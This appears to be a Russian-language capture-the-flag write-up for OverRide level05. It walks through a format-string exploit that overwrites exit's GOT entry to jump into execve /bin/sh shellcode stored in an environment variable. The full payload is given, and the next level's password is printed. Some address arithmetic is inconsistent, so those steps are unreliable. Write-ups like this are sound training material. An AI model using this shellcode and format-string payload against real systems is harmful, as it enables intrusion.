[back](../defense.md)

На этом уровне прога запрашивает ввод данных и выводит их в нижнем регистре

```
level05@OverRide:~$ ./level05
sf
sf
level05@OverRide:~$ ./level05
DFG
dfg
```

Запустив gdb, обнаруживаем, что программа проста: 

читает в буфер из 100 символов,

```
0x08048466 <+34>:	movl   $0x64,0x4(%esp)
```

программа проверяет каждый символ и, если он в верхнем регистре, выполняет XOR 0x20  

```
0x080484bb <+119>:	xor    $0x20,%edx
```

преобразовая введенные символы в нижний регистр. 

После этой операции буфер отправляется в printf, 

```
0x08048507 <+195>:	call   0x8048340 <printf@plt>
```

что открывает нам лазейку для эксплойта строкового формата.

Функция main заканчивается интересными строками:

```
0x08048507 <+195>:	call   0x8048340 <printf@plt>
0x0804850c <+200>:	movl   $0x0,(%esp)
0x08048513 <+207>:	call   0x8048370 <exit@plt>
```

Попробуем воспользоваться уязвимостями функции печати

Однако, стек не является исполняемым. 

Переполнение буфера нам не даст возможности вызвать system("/bin/sh")) в стеке.

Отметим, что буфер модифицируется с помощью XOR, и мы не можем поместить туда наш шелл-код. 

Еще и main покидает программу через выход, а не возврат. 

У нас есть два варианта: либо изменить вызов для выхода в глобальной таблице смещений, либо манипулировать значением, которое printf будет использовать для возврата из своего вызова и возврата в main. 

В обоих случаях можно использовать шелл-код переменной окружения.

Для этого будем использовать стандартный вызов, взятый [тут](https://shell-storm.org/shellcode/files/shellcode-827.html)

```
char *shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69"
		  "\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80";
(gdb) b *main
Breakpoint 1 at 0x8048444
(gdb) r
Starting program: /home/users/level05/level05
Breakpoint 1, 0x08048444 in main ()
(gdb) x/200s environ
0xffffd892:	 "/home/users/level05/level05"
0xffffd8ae:	 "SHELL=/bin/bash"

export SHELLCODE=`python -c 'print("\x90"*100 + 
"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80")'`

0xffffd80c:	 "/home/users/level05/level05"
0xffffd828:	 "SHELLCODE=\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220
\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220
\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220
\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220
\220\220\220\220\220\220\220\220\220\220\061\300Ph//shh/bin\211\343PS\211\341\260\v\315\200"
0xffffd8ae:	 "SHELL=/bin/bash"

(gdb) x/200sx 0xffffd828
0xffffd828:	0x53	0x48	0x45	0x4c	0x4c	0x43	0x4f	0x44
0xffffd830:	0x45	0x3d	0x90	0x90	0x90	0x90	0x90	0x90
0xffffd838:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xffffd840:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xffffd848:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xffffd850:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xffffd858:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xffffd860:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xffffd868:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xffffd870:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xffffd878:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xffffd880:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xffffd888:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xffffd890:	0x90	0x90	0x90	0x90	0x90	0x90	0x31	0xc0
0xffffd898:	0x50	0x68	0x2f	0x2f	0x73	0x68	0x68	0x2f
0xffffd8a0:	0x62	0x69	0x6e	0x89	0xe3	0x50	0x53	0x89
0xffffd8a8:	0xe1	0xb0	0x0b	0xcd	0x80	0x00	0x53	0x48
0xffffd8b0:	0x45	0x4c	0x4c	0x3d	0x2f	0x62	0x69	0x6e
0xffffd8b8:	0x2f	0x62	0x61	0x73	0x68	0x00	0x54	0x45
0xffffd8c0:	0x52	0x4d	0x3d	0x78	0x74	0x65	0x72	0x6d
0xffffd8c8:	0x2d	0x32	0x35	0x36	0x63	0x6f	0x6c	0x6f
0xffffd8d0:	0x72	0x00	0x53	0x53	0x48	0x5f	0x43	0x4c
0xffffd8d8:	0x49	0x45	0x4e	0x54	0x3d	0x31	0x39	0x32
0xffffd8e0:	0x2e	0x31	0x36	0x38	0x2e	0x35	0x36	0x2e
0xffffd8e8:	0x31	0x20	0x36	0x31	0x35	0x30	0x35	0x20
(gdb)
```

Итак наш шеллкод находится по адресу 0xffffd897.

Отступим на 2 байта, чтобы перейти четко на начальный адрес его исполнения.

т.к. адрес слишком велик, чтобы перейти к printf()десятичному %d формату (выходит за пределы maxint). Мы можем передать его в десятичном виде как 2 
коротких целых числа (записанных по 2 байта каждое).

```
0xffffd897 - 0х00000010 = 0xffffd887
```

разделим на 2 ча и переведем в десятичный код.

```
0xffffd887
0xd838 -> 55431
0xffff -> 65535
```

Посмотрим, сразу ли печатается введенные символы:

```
level05@OverRide:~$ python -c 'print "BBBB"+"-%x"*21' | ./level05
bbbb-64-f7fcfac0-f7ec3af9-ffffd60f-ffffd60e-0-ffffffff-ffffd694-f7fdb000-62626262-2d78252d-
252d7825-78252d78-2d78252d-252d7825-78252d78-2d78252d-252d7825-78252d78-2d78252d-252d7825
```

Наши символы находятся на 10й позиции.

```
0xffffd828
```

Найдем адрес выхода:

```
(gdb) info function exit
All functions matching regular expression "exit":
Non-debugging symbols:
0x08048370  exit
0x08048370  exit@plt
(gdb) x/i 0x08048370
0x8048370 <exit@plt>:	jmp    *0x80497e0
```

Для взлома используем: адрес exit, и exit +2 для двух частей внедряемого числа.

адрес шеллкода в десятичном формате, разделенный на две части по 4 байта

55431 для одной части

65535 - 55431 = 10104 для другой части 

printf()аргументы форматирования:

%10$hn для 10-го аргумента, полуслово/короткое целое [2 байта]

%11$hn для 11-го аргумента, полуслово/короткое целое [2 байта]

Получаем:

```
(python -c "print '\xe0\x97\x04\x08' + '\xe2\x97\x04\x08' + '%55423c' + '%10\$hn'+ '%10104c' + '%11\$hn'"; cat) | ./level05
```

проверяем.

```
cat /home/users/level06/.pass
h4GtNnaMs2kZFN92ymTr2DcJHAzMfzLW25Ep59mq 
```

[back](../defense.md)